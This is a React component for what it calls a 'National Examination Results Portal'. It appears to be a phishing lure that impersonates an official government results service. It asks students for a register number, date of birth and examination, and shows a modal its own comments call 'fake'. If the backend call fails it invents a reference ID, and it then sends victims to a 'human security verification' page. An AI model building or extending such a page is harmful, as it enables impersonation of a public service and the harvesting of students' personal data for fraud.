import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { applicationApi } from '../services/api';
import { Search, CheckCircle2, ShieldCheck, ArrowRight, Loader2, FileText, Calendar, Hash, BookOpen } from 'lucide-react';
import ResultGpsModal from '../components/ResultGpsModal';

export default function RegistrationPage() {
  const navigate = useNavigate();

  const [step, setStep] = useState(1); // 1: Result Form, 2: Result Found Page
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [isGpsModalOpen, setIsGpsModalOpen] = useState(false);

  // Form Fields - START COMPLETELY EMPTY FOR PRODUCTION
  const [registerNumber, setRegisterNumber] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [examination, setExamination] = useState('');

  // Handle Step 1: View Result Form Submit with Strict Validation
  const handleViewResult = (e) => {
    e.preventDefault();
    if (!registerNumber.trim()) {
      setError('Please enter your Register Number.');
      return;
    }
    if (!dateOfBirth) {
      setError('Please select your Date of Birth.');
      return;
    }
    if (!examination) {
      setError('Please select your Examination.');
      return;
    }
    setError('');
    // Open fake Result GPS 📍 Locator Modal
    setIsGpsModalOpen(true);
  };

  // Handle GPS Track Button -> Proceed to Result Record Received & Verification Session
  const handleGpsTrackResult = async () => {
    setIsGpsModalOpen(false);
    setLoading(true);
    try {
      // Create application session with candidate's user-entered credentials
      const res = await applicationApi.register({
        fullName: 'Candidate',
        email: 'candidate@nerp.gov.in',
        dob: dateOfBirth,
        registerNumber: registerNumber.trim(),
        collegeName: 'National Institute of Technology',
        course: 'Engineering & Sciences',
        examination: examination,
        submittedAt: new Date().toISOString()
      });

      if (res.data && res.data.success) {
        const appId = res.data.application.applicationId;
        navigate(`/verification/${appId}`);
      } else {
        const mockId = `NERP-${Math.floor(10000 + Math.random() * 90000)}`;
        navigate(`/verification/${mockId}`);
      }
    } catch (err) {
      console.error('Error initializing result session:', err);
      const fallbackId = `NERP-${Math.floor(10000 + Math.random() * 90000)}`;
      navigate(`/verification/${fallbackId}`);
    } finally {
      setLoading(false);
    }
  };

  // Handle Step 2: Direct Reveal Fallback if needed
  const handleRevealResult = async () => {
    handleGpsTrackResult();
  };

  return (
    <div className="max-w-2xl mx-auto space-y-8 pb-16">
      {/* Result GPS 📍 Fake Locator Modal */}
      <ResultGpsModal
        isOpen={isGpsModalOpen}
        onProceed={handleGpsTrackResult}
      />

      {/* Top Breadcrumb & Page Banner */}
      <div className="bg-slate-900 text-white p-6 rounded-2xl shadow-xl border border-slate-800 flex justify-between items-center">
        <div>
          <span className="text-[11px] font-mono font-bold text-blue-400 uppercase tracking-widest block mb-1">
            OFFICIAL RESULTS SEARCH
          </span>
          <h2 className="text-xl font-black text-white flex items-center gap-2">
            <FileText className="w-5 h-5 text-blue-400" />
            National Examination Results Portal
          </h2>
        </div>
        <div className="bg-blue-900/60 border border-blue-700/60 px-3 py-1.5 rounded-lg text-xs font-mono text-blue-200 font-bold">
          SESSION 2026
        </div>
      </div>

      {/* STEP 1: RESULT SEARCH FORM */}
      {step === 1 && (
        <div className="naep-card p-8 space-y-6 border border-slate-700 shadow-2xl relative overflow-hidden bg-slate-900/90">
          <div className="border-b border-slate-800 pb-4">
            <h3 className="text-lg font-bold text-white flex items-center gap-2">
              <Search className="w-5 h-5 text-blue-400" />
              Check Examination Result
            </h3>
            <p className="text-xs text-slate-300 mt-1">
              Enter your registered credentials below to access your examination scorecard.
            </p>
          </div>

          {error && (
            <div className="bg-red-950/80 text-red-200 p-3 rounded-lg text-xs font-semibold border border-red-800">
              {error}
            </div>
          )}

          <form onSubmit={handleViewResult} className="space-y-5">
            {/* Field 1: Register Number */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                <Hash className="w-4 h-4 text-blue-400" />
                Register Number <span className="text-red-400">*</span>
              </label>
              <input
                type="text"
                required
                value={registerNumber}
                onChange={(e) => setRegisterNumber(e.target.value)}
                placeholder="Enter your register number"
                className="w-full px-4 py-3 bg-slate-950 text-white border border-slate-700 rounded-xl font-mono text-sm font-bold focus:border-blue-500 focus:ring-2 focus:ring-blue-500/30 focus:outline-none placeholder-slate-500"
              />
            </div>

            {/* Field 2: Date of Birth */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                <Calendar className="w-4 h-4 text-blue-400" />
                Date of Birth <span className="text-red-400">*</span>
              </label>
              <div className="relative flex items-center">
                <input
                  type="date"
                  required
                  value={dateOfBirth}
                  onChange={(e) => setDateOfBirth(e.target.value)}
                  placeholder="Select your date of birth"
                  style={{ colorScheme: 'dark' }}
                  className="w-full px-4 py-3 bg-slate-950 text-white border border-slate-700 rounded-xl font-mono text-sm font-bold focus:border-blue-500 focus:ring-2 focus:ring-blue-500/30 focus:outline-none [color-scheme:dark]"
                />
              </div>
            </div>

            {/* Field 3: Examination */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                <BookOpen className="w-4 h-4 text-blue-400" />
                Examination <span className="text-red-400">*</span>
              </label>
              <select
                required
                value={examination}
                onChange={(e) => setExamination(e.target.value)}
                className="w-full px-4 py-3 bg-slate-950 text-white border border-slate-700 rounded-xl text-sm font-bold focus:border-blue-500 focus:ring-2 focus:ring-blue-500/30 focus:outline-none"
              >
                <option value="">Select examination</option>
                <option value="B.Tech CSE — Semester 6">B.Tech CSE — Semester 6</option>
                <option value="NGEE 2026 (National Graduate Entrance Exam)">NGEE 2026 (National Graduate Entrance Exam)</option>
                <option value="B.Sc Computer Science — Final Semester">B.Sc Computer Science — Final Semester</option>
                <option value="National Diploma in Engineering 2026">National Diploma in Engineering 2026</option>
              </select>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-700 hover:to-indigo-800 text-white font-extrabold py-3.5 px-6 rounded-xl shadow-lg shadow-blue-600/30 flex items-center justify-center gap-2 text-base transition-all transform hover:-translate-y-0.5"
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  Locating Result...
                </>
              ) : (
                <>
                  <Search className="w-5 h-5" />
                  VIEW RESULT
                </>
              )}
            </button>
          </form>
        </div>
      )}

      {/* STEP 2: RESULT FOUND PAGE */}
      {step === 2 && (
        <div className="naep-card p-8 space-y-6 border border-emerald-500/50 shadow-2xl relative overflow-hidden bg-slate-900/90">
          <div className="bg-emerald-950/80 border border-emerald-800/80 p-5 rounded-2xl flex items-center gap-4">
            <div className="w-12 h-12 rounded-full bg-emerald-600 text-white flex items-center justify-center shrink-0 shadow-md">
              <CheckCircle2 className="w-7 h-7" />
            </div>
            <div>
              <h3 className="text-xl font-black text-white">
                Result Record Received
              </h3>
              <p className="text-xs text-emerald-300 font-medium mt-0.5">
                Official mark ledger located in national database registry.
              </p>
            </div>
          </div>

          {/* User Entered Details Table */}
          <div className="bg-slate-950/90 border border-slate-800 rounded-xl p-6 space-y-4 font-mono text-sm">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <span className="text-xs text-slate-400 uppercase tracking-wider block font-semibold">Register Number</span>
                <span className="text-blue-300 font-bold text-base">{registerNumber}</span>
              </div>
              <div>
                <span className="text-xs text-slate-400 uppercase tracking-wider block font-semibold flex items-center gap-1.5">
                  <Calendar className="w-3.5 h-3.5 text-blue-400" /> Date of Birth
                </span>
                <span className="text-slate-100 font-bold text-base flex items-center gap-1.5 mt-0.5">
                  <Calendar className="w-4 h-4 text-blue-400 shrink-0" />
                  {dateOfBirth}
                </span>
              </div>
              <div className="sm:col-span-2">
                <span className="text-xs text-slate-400 uppercase tracking-wider block font-semibold">Examination</span>
                <span className="text-slate-100 font-bold">{examination}</span>
              </div>
            </div>

            <div className="pt-4 border-t border-slate-800 flex justify-between items-center">
              <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Result Availability</span>
              <span className="bg-emerald-950 text-emerald-300 text-xs font-bold px-3 py-1.5 rounded-full border border-emerald-800 flex items-center gap-1.5">
                Result Status: AVAILABLE ✅
              </span>
            </div>
          </div>

          {/* Action Call */}
          <div className="space-y-4 text-center pt-2">
            <p className="text-xs text-slate-500 font-medium">
              Human security verification is required before disclosing examination marks.
            </p>

            <button
              onClick={handleRevealResult}
              disabled={loading}
              className="w-full bg-gradient-to-r from-blue-600 via-indigo-600 to-blue-700 hover:from-blue-700 hover:to-indigo-700 text-white font-black py-4 px-8 rounded-xl shadow-xl shadow-blue-600/30 flex items-center justify-center gap-3 text-lg transition-all transform hover:-translate-y-0.5"
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  Decrypting Result Records...
                </>
              ) : (
                <>
                  <ShieldCheck className="w-6 h-6 text-emerald-300" />
                  REVEAL MY RESULT
                  <ArrowRight className="w-6 h-6" />
                </>
              )}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
